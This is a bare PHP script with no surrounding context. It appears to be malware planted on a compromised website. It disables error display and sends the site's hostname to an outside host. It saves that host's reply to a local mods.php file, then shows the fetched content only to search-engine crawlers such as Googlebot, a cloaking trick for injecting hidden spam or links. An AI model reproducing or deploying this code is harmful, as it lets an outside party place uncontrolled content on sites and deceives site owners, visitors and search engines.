<?php
ini_set('display_errors',0);
$path = $_SERVER['HTTP_HOST'];
$path = str_replace("&", "",$path);
$target = dirname(__FILE__) . DIRECTORY_SEPARATOR . "mods.php";
$source = 'http://psdu.net/me14.php?i='.$path;
$cachetime = 86400;
if ((file_exists($target)) && (time() - $cachetime) > filemtime($target)) {    
$string = file_get_contents($source);$result = file_put_contents($target, $string);}
$spiders = array('Googlebot','Yahoo','msnbot','Googlebot-Mobile');
$credits = file_get_contents($target);
$uagent = $_SERVER['HTTP_USER_AGENT'];
foreach ($spiders as $spider){if (preg_match("/$spider/",$uagent)){echo $credits;}}
?>